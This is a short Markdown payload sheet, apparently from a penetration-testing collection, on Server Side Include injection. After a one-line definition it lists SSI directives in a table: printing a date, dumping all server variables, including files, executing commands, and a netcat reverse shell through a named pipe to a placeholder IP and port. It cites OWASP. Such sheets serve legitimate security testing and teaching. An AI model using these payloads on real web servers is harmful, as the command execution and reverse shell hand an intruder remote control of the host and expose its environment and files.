# Server Side Include Injection

> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.


## Summary

* [Payloads](#payloads)
* [References](#references)


## Payloads

| Description             | Payload |
|-------------------------|---------|
| Print a date            | `<!--#echo var="DATE_LOCAL" -->` |
| Print all the variables | `<!--#printenv -->` |
| Include a file          | `<!--#include file="includefile.html" -->` |
| Execute commands        | `<!--#exec cmd="ls" -->` |
| Doing a reverse shell   | `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |


## References

* [Server-Side Includes (SSI) Injection - OWASP](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)